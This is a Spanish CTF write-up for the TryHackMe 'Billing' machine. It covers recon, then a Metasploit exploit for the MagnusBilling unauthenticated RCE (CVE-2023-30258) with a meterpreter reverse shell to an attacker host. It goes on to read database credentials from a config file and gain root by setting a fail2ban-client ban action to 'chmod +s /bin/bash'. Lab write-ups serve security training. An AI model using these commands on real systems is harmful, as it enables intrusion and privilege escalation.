# Billing - THM
- 10.130.160.160
- nmap -sCV -Pn 10.130.160.160 -> 22,80,3306 mariadb -> mariaDB 10.3.23 or earlier,5038/tcp asterisk  
- accedemos web y te redirige a /mbilling
- fuzzeamos -> vemos robots.txt luuego / LICENSE y index.html y index.php -> ffuf -u http://10.130.160.160/mbilling/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt ffuf -u http://10.130.160.160/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
- http://10.130.160.160/mbilling/index.php + README.md si entramos aquí vemos parametros de configuración y la versión 7
- Buscamos en metasploit por MagnusBilling 7
- La vulnerabilidad CVE-2023-30258 afecta a MagnusBilling versiones 6.x y 7.x
-  msfconsole
use exploit/linux/http/magnusbilling_unauth_rce
set RHOSTS 10.130.160.160
set RPORT 80
set TARGETURI /mbilling/

set payload php/meterpreter_reverse_tcp
set LHOST 192.168.173.148
set LPORT 4444
run

-> entramos -> shell python3 -c 'import pty; pty.spawn("/bin/bash")' y export TERM=xterm vamos a cd user y pillamos flag
dentro de /var/www/html/mbilling/protected/config empezamos a mirar archivos y dentro de config main.php y veo que nombra esto /etc/asterisk/res_config_mysql.conf dentro hay unas credenciales!!!.
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5

Probemos a ver la BD -> mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling -> nos conectamos desde la máquina que si tiene permiso. y accedemos a la BD pero no encuentro gran cosa.

Volvemos con el user asterisk y a ver que puede escalar sudo -l -> (ALL) NOPASSWD: /usr/bin/fail2ban-client
sudo /usr/bin/fail2ban-client status para ver el estado de las carceles -> `- Jail list:	ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
- sudo /usr/bin/fail2ban-client get asterisk-iptables actions vemos acciones que tiene esta jail
- sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash' -> cambiamos la accion
- sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4 ejecutamos acción y ls -la /bin/bash y ahora tiene suid -> /bin/bash -p y listo cd pillamos flag

